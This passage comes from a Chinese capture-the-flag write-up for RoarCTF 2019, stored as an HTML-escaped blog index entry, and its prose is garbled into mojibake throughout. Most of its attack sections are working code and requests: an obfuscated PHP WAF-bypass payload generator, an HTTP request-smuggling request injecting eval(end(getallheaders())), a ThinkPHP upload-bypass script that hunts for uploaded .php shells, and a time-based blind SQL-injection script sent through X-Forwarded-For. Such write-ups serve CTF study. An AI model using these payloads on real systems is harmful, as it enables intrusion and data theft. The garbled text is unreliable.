:&quot;(~((1).(0)){0})&amp;((10000000000000000000).(1)){3}&quot;,    &quot;A&quot; :&quot;(~((2).(0)){0})&amp;(~((~((1).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,    &quot;P&quot; :&quot;(~((1.1).(0)){1})&amp;((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))&quot;,    &quot;O&quot; :&quot;(~((0).(0)){0})&amp;(~((~((8).(0)){0})&amp;((~((2).(0)){0})&amp;(~((10000000000000000000).(1)){3}))))&quot;,    &quot;S&quot; :&quot;(~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((2).(0)){0})&amp;(~((10000000000000000000).(1)){3})))&quot;,    &quot;U&quot; :&quot;(((10000000000000000000).(1)){3})|((~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((1).(0)){0})&amp;(~((1.1).(0)){2}))))&quot;,    &quot;_&quot; :&quot;((10000000000000000000).(1)){3}|(((~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((1).(0)){0})&amp;(~((1.1).(0)){1})))))&quot;,    &quot;T&quot; :&quot;(~(((1).(0)){0}&amp;(~((2).(0)){0})))&amp;(~((~((10000000000000000000).(1)){3})&amp;(~(((1).(0)){0}&amp;(~((1.1).(0)){1})))))&quot;,    &quot;I&quot; :&quot;(~(((0).(0)){0}))&amp;(~((~((8).(0)){0})&amp;((~((1).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))))&quot;,    &quot;N&quot; :&quot;(~((0).(0)){0})&amp;(~((~((8).(0)){0})&amp;((~(((2).(0)){0}))&amp;(~((~((1).(0)){0})&amp;((10000000000000000000).(1)){3})))))&quot;,    &quot;f&quot; :&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))|((~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))))&quot;,    &quot;B&quot; :&quot;(~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,    &quot;r&quot; :&quot;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,    &quot;[&quot; :&quot;(~(((((-1).(0)){0})&amp;(((4).(0)){0}))))&amp;(~((~((8).(0)){0})&amp;((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3})))))&quot;,    &quot;]&quot; :&quot;(((10000000000000000000).(1)){3})|((((8).(0)){0})&amp;(~(((((-1).(0)){0})&amp;(((4).(0)){0})))))&quot;,    &quot;C&quot;:&quot;(~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,    &quot;M&quot;:&quot;(~(((0).(0)){0}))&amp;(~((~(((8).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,    &quot;\\&quot;:&quot;(~(((((1).(0)){0}))&amp;(~(((2).(0)){0})))&amp;~((~(((10000000000000000000).(1)){3}))&amp;~((((8).(0)){0})&amp;(~(((((-1).(0)){0})&amp;(((4).(0)){0})))))))&quot;,    &quot;/&quot;:&quot;((((1.1).(0)){1})|(((-1).(0)){0}))&quot;,    &quot;G&quot;:&quot;(~(((8).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,    &quot;g&quot;:&quot;(((10000000000000000000).(1)){3})|((((2).(0)){0})&amp;(((1.1).(0)){1}))&quot;,    &quot;a&quot;:&quot;((((1).(0)){0})&amp;((~((2).(0)){0})))|((((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))&amp;(~((((1).(0)){0})&amp;(~(((1.1).(0)){1})))))&quot;    }s=&quot;scandir&quot;def topayload(s):    result=&quot;&quot;    for i in s:        if(i in arr):            result+=(&quot;(&quot;+arr[i]+&quot;)&quot;+&quot;.&quot;)            continue        if(i.upper() in arr):            result+=(&quot;(&quot;+arr[i.upper()]+&quot;)&quot;+&quot;.&quot;)            continue        if(i.lower() in arr):            result+=(&quot;(&quot;+arr[i.lower()]+&quot;)&quot;+&quot;.&quot;)    return result[:-1]def tomethod(meth,para,c=True):    if c:        return &quot;(&quot;+topayload(meth)+&quot;)(&quot;+topayload(para)+&quot;)&quot;    else :        return &quot;(&quot;+topayload(meth)+&quot;)(&quot;+(para)+&quot;)&quot;# print(tomethod(&quot;var_dump&quot;,tomethod(&quot;scandir&quot;,&quot;/&quot;),False))print(tomethod(&quot;var_dump&quot;,tomethod(&quot;file&quot;,&quot;/f1agg&quot;),False))# print(tomethod(&quot;file_get_contents&quot;,&quot;/f1agg&quot;))</code></pre><h4 id="è§£æ³•äºŒ-HTTPèµ°ç§"><a href="#è§£æ³•äºŒ-HTTPèµ°ç§" class="headerlink" title="è§£æ³•äºŒ HTTPèµ°ç§"></a>è§£æ³•äºŒ HTTPèµ°ç§</h4><p>httpèµ°ç§è¯·çœ‹:<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p><p>è¿™é¢˜phpç¦ç”¨äº†<code>$blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;åå¼•å·&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</code></p><p>apacheå†ç¦ç”¨äº†å­—æ¯å’Œä¸å¯æ‰“å°å­—ç¬¦</p><p>åæ¥çœ‹åˆ«äººçš„wpçŸ¥é“äº†,è™½ç„¶æœåŠ¡å™¨è¿”å›400,ä½†æ˜¯è¿˜ä¼šå°†è¯·æ±‚è½¬å‘ç»™åç«¯,æ ‡å‡†çš„httpèµ°ç§</p><p><img src="https://i.loli.net/2019/10/18/9YgzckxODPiNe6C.png" alt="image.png"></p><p>çœŸå‡ æŠŠç¥å¥‡ï¼Œåˆšçœ‹åˆ°httpèµ°ç§çš„æ—¶å€™æˆ‘è¿˜ä»¥ä¸ºæ˜¯å‰åç«¯å¯¹content-typeçš„è§£æä¸åŒ</p><p>ç»“åˆgetallheadsæ¥ç»•è¿‡phpå­—ç¬¦é™åˆ¶</p><p>æœ€åpayload:</p><pre><code>POST /calc.php?num=eval(end(getallheaders())); HTTP/1.1Host: node3.buuoj.cn:28023Accept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36Referer: http://node3.buuoj.cn:28023/Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 422Content-Length: 0A: var_dump(file_get_contents(&quot;/f1agg&quot;));</code></pre><h4 id="è§£æ³•ä¸‰-åˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡apache-waf"><a href="#è§£æ³•ä¸‰-åˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡apache-waf" class="headerlink" title="è§£æ³•ä¸‰ åˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡apache waf"></a>è§£æ³•ä¸‰ åˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡apache waf</h4><p>phpå­—ç¬¦ä¸²è§£æç‰¹æ€§</p><p><img src="https://image.3001.net/images/20190904/1567560438_5d6f12f680afe.png!small" alt=""></p><p><img src="https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small" alt=""></p><p>å½“æˆ‘ä»¬å‘é€è¿™æ ·ä¸€ä¸ªè¯·æ±‚æ˜¯:<code>?%20num=123</code></p><p>apacheçš„æ£€æŸ¥è§„åˆ™åªèƒ½åŒ¹é…åˆ°num,è€Œè¿™ä¸ªè¯·æ±‚åœ¨phpå´ä¼šè¢«è§£æä¸º$_GET[â€˜numâ€™]æœ€åæˆåŠŸç»•è¿‡apacheçš„waf</p><h3 id="Easy-Java"><a href="#Easy-Java" class="headerlink" title="Easy Java"></a>Easy Java</h3><p>æ‰«ç›®å½•å‘ç°ä¸€ä¸ªDownload,å»ç™»å…¥ç•Œé¢æŸ¥æ‰¾ä¸€ä¸‹download,å‘ç°<code>Download?filename=help.docx</code></p><p>å¯æ˜¯æ— è®ºä¸‹ä»€ä¹ˆä¹Ÿä¸è¡Œ,çœ‹äº†åˆ«äººçš„wpå‘ç°postå°±å¯ä»¥233333</p><p>æ¥ä¸‹æ¥å°±ç®€å•äº†,å› ä¸ºè¿™æ˜¯ä¸€ä¸ªtomcatçš„ç½‘ç«™</p><p>è´´ä¸€ä¸ªtomcatçš„ç»“æ„å›¾</p><p><img src="https://i.loli.net/2019/09/01/LduWtSfIh8bDA7Z.png" alt=""></p><p>å…ˆå»æŸ¥çœ‹ä¸€ä¸‹WEB-INF/web.xml</p><p>å‘ç°</p><pre><code class="xml">    &lt;servlet&gt;        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;        &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;    &lt;/servlet&gt;</code></pre><p>äºæ˜¯å»WEB-INF/classes/com/wm/ctf/FlagController.class</p><p>æŸ¥çœ‹,å‘ç°ä¸€ä¸ªbase64ç¼–ç çš„å­—ç¬¦ä¸²</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82oi6jxybj31240l2dj8.jpg" alt="image.png"></p><h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h3><h4 id="æºç -1"><a href="#æºç -1" class="headerlink" title="æºç "></a>æºç </h4><pre><code class="php">&lt;?phpnamespace Home\Controller;use Think\Controller;class IndexController extends Controller{    public function index()    {        show_source(__FILE__);    }    public function upload()    {        $uploadFile = $_FILES[&#39;file&#39;] ;        $_FILES[&#39;file&#39;][&#39;name&#39;]        if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) {            return false;        }        $upload = new \Think\Upload();// å®ä¾‹åŒ–ä¸Šä¼ ç±»        $upload-&gt;maxSize  = 4096 ;// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å°        $upload-&gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹        $upload-&gt;rootPath = &#39;./Public/Uploads/&#39;;// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½•        $upload-&gt;savePath = &#39;&#39;;// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½•        $info = $upload-&gt;upload() ;        if(!$info) {// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯          $this-&gt;error($upload-&gt;getError());          return;        }else{// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯          $url = __ROOT__.substr($upload-&gt;rootPath,1).$info[&#39;file&#39;][&#39;savepath&#39;].$info[&#39;file&#39;][&#39;savename&#39;] ;          echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1));        }    }}</code></pre><h4 id="è§£æ³•ä¸€-thinkphpæ¼æ´"><a href="#è§£æ³•ä¸€-thinkphpæ¼æ´" class="headerlink" title="è§£æ³•ä¸€ thinkphpæ¼æ´"></a>è§£æ³•ä¸€ thinkphpæ¼æ´</h4><p>åˆ©ç”¨<code>Think\Controller,\Think\Upload()</code> ç­‰å…³é”®å­—æŸ¥è¯¢åˆ°è¯¥thinkphpç‰ˆæœ¬å¤§è‡´åœ¨3.2.x,è¿™é‡Œæˆ‘å»æ‰¾äº†3.2.3çš„æºç </p><p>é˜…è¯»æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†ä»£ç å‘ç°</p><pre><code class="php">&lt;?php    ....    public function upload($files = &#39;&#39;)    {        if (&#39;&#39; === $files) {            $files = $_FILES;        }        .....        $files = $this-&gt;dealFiles($files);        foreach ($files as $key =&gt; $file) {            $file[&#39;name&#39;] = strip_tags($file[&#39;name&#39;]);            if (!isset($file[&#39;key&#39;])) {                $file[&#39;key&#39;] = $key;            }        ....    }    ....    ?&gt;</code></pre><p>è¿™é‡Œæ³¨æ„åˆ°æœ‰ä¸ªstrip_tags,æŸ¥è¯¢æ–‡æ¡£<code>ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°</code></p><p>ok,æˆåŠŸæ‰¾åˆ°ç»•è¿‡åç¼€åé™åˆ¶çš„æ–¹æ³•</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82rhln3m6j31240l2whe.jpg" alt="image.png"></p><p>æˆåŠŸgetflagç¾æ»‹æ»‹</p><h4 id="è§£æ³•äºŒ-ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ç»•è¿‡åç¼€åæ£€æµ‹"><a href="#è§£æ³•äºŒ-ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ç»•è¿‡åç¼€åæ£€æµ‹" class="headerlink" title="è§£æ³•äºŒ  ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ç»•è¿‡åç¼€åæ£€æµ‹"></a>è§£æ³•äºŒ  ä¸Šä¼ å¤šä¸ªæ–‡ä»¶ç»•è¿‡åç¼€åæ£€æµ‹</h4><p>å¤§ä½¬ä»¬å¤ªå¼ºäº†/fad/fad</p><pre><code class="php"> $uploadFile = $_FILES[&#39;file&#39;] ;if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) {            return false;        }</code></pre><p>å¦‚æœä¸Šä¼ å¤šä¸ªæ–‡ä»¶, $uploadFileå†…åŒ…å«å¤šä¸ªæ–‡ä»¶,<code>strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;)</code>è‡ªç„¶ä¹Ÿå°±æ— æ•ˆäº†,æ¥ä¸‹æ¥å°±æ˜¯è·å–æ–‡ä»¶å,å°±å¯ä»¥getshell,å› ä¸ºthinkphpæ–‡ä»¶åæ˜¯é€’å¢çš„,æ‰€ä»¥ä¹Ÿå°±å¾ˆå®¹æ˜“è·å–åˆ°æƒ³è¦çš„æ–‡ä»¶äº†</p><pre><code class="pyhon">import requestsurl=&quot;http://aba32602-5c6b-4a9f-bfa6-bbf2ca660f7e.node3.buuoj.cn/Public/Uploads/2019-10-18/&quot;i=(int(&quot;5da9dd208595a&quot;,16)+1)while True:    print(url+hex(i)[2:]+&quot;.php&quot;)    res=requests.get(url+hex(i)[2:]+&quot;.php&quot;)    print(res.status_code)    if(res.status_code==200):        print(url+hex(i)[2:]+&quot;.php&quot;)        break    i+=1</code></pre><p>è™½ç„¶è¯´å¯ä»¥çˆ†å‡ºæ¥ï¼Œä¸è¿‡ä¹Ÿè¦è·‘å¥½ä¸€ä¼š</p><h3 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h3><p>åˆ©ç”¨libcurlå’Œparas_urlçš„å·®å¼‚æ¥åˆ¤æ–­</p><p><a href="http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com</a></p><p>200</p><p><a href="http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219</a></p><p>504</p><p>è€Œè®¿é—®<a href="http://node3.buuoj.cn:28001/?url=http://39.108.164.219" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://39.108.164.219</a></p><p>ä¹Ÿæ˜¯504,æ‰€ä»¥æœ‰å¯èƒ½ä½¿ç”¨file_get_contentsæ¥è®¿é—®url</p><p>åˆšå¼€å§‹ä¸€ç›´ç›¯ç€url,åé¢çœ‹åˆ°æ”¶é›†ä¿¡æ¯,99%æ˜¯sqlæ³¨å…¥çš„é¢˜</p><p>å°±æ˜¯ä¸çŸ¥é“è¦æ”¶é›†ä»€ä¹ˆä¿¡æ¯</p><pre><code class="html">&lt;!-- Debug Info:  Duration: 0.20821499824524 s  Current Ip: 127.0.0.1  --&gt;&lt;!-- Debug Info:  Duration: 0.34751987457275 s  Current Ip: &#39;# Last Ip: &#39; --&gt;</code></pre><p>è¿™é¢˜è™½ç„¶æ˜¯sqlæ³¨å…¥,ä½†æ¯”è¾ƒæ“è›‹çš„æ˜¯,sqlæ³¨å…¥çš„æ˜¯last ip</p><p>å› ä¸ºè¿™ä¸ªåŠ ä¸Šè‡ªå·±çš„æ‡’æƒ°è®©æˆ‘æäº†8-9ä¸ªå°æ—¶,å› å°å¤±å¤§/fad</p><p>é¢˜ç›®æç¤ºä¼šæ”¶é›†ä¿¡æ¯,èƒ½æ”¶é›†çš„å¤§æ¦‚ä¹Ÿå°±æ˜¯ipåœ°å€</p><p>äºæ˜¯æ‰¾åˆ°x-forward-for httpæ³¨å…¥,è™½ç„¶è¯´çš„è½»æ¾,ä½†æ˜¯æˆ‘å®Œå…¨æ‰¾äº†å¥½ä¹…è¿˜åŠ ä¸Šäº†wpçš„å¸®åŠ©</p><p>emmmmç›´æ¥æ‰”è„šæœ¬</p><pre><code class="python">import requestsimport stringimport randomimport timeimport sysdef rand_str(length=8):    return &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, length))ii=0def curl_url(sql):    global ii    headers={        &quot;Host&quot;:&quot;node3.buuoj.cn:28645&quot;,        &quot;Cache-Control&quot;:&quot;max-age=0&quot;,        &quot;X-Forwarded-For&quot;:&quot;&quot;,        &quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;,        &quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;,        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;,        &quot;Connection&quot;:&quot;close&quot;    }    cookies={&quot;track_uuid&quot;:&quot;1e3b12a4-60f8-4778-a0b7-%s;&quot; % rand_str()}    #1&#39;+if(ascii(substr(hex((select GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database())),1,1))&gt;0,sleep(10),0)+&#39;13    # headers[&quot;X-Forwarded-For&quot;]=&quot;1&#39;+if(&quot;+sql+&quot;,sleep(10),0)+&#39;&quot;+str(ii)    url=&quot;http://node3.buuoj.cn:28841?url=http://127.0.0.1&quot;    #æ¸…ç©º    while True:        headers[&quot;X-Forwarded-For&quot;]=&quot;clear&quot;+str(ii)        try:            res= requests.get(url,headers=headers,cookies=cookies,timeout=3)        except :            pass        if &quot;Last Ip: clear&quot; in res.text:            break        ii+=1    #å‹å…¥    headers[&quot;X-Forwarded-For&quot;]=&quot;1&#39;+if(&quot;+sql+&quot;,sleep(10),0)+&#39;&quot;+str(ii)    res= requests.get(url,headers=headers,cookies=cookies,timeout=3)    #æ‰§è¡Œ    while True:        ii+=1        headers[&quot;X-Forwarded-For&quot;]=&quot;clear&quot;+str(ii)        try:            res= requests.get(url,headers=headers,cookies=cookies,timeout=3)        except :            return 1        if sql not in res.text:            curl_url(sql)        return 0#database information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf#table  F4l9_t4b1e#column F4l9_C01uMn#flag flag{G1zj1n_W4nt5_4_91r_Fr1end},flag{03a6ead5-ffec-4bc0-bffd-92efd5a81e11}sql=&quot;(substr(hex((select GROUP_CONCAT(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e )),INDEX,1))=&#39;GUESS&#39;&quot;result=&quot;696e666f726d6174696f6e5f736368656d612c746573742c6d7973716c2c637466747261696e696e672c706572666F726D616E63655F736368656D612c46346c395&quot;result=&quot;666c61677b47317a6a316e5f57346e74355f345f393172115&quot;index=len(result)while True:    index+=1    for i in range(16):        ii+=1        tmp=sql.replace(&quot;INDEX&quot;,str(index)).replace(&quot;GUESS&quot;,hex(i)[2:])        if curl_url(tmp):            result+=hex(i)[2:]            print(result)            break        print(&quot;ç¬¬&quot;+str(index)+&quot;ä¸æ˜¯&quot;+hex(i)[2:])</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2019/10/15/roarctf2019/">http://blog.ccreater.top/2019/10/15/roarctf2019/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
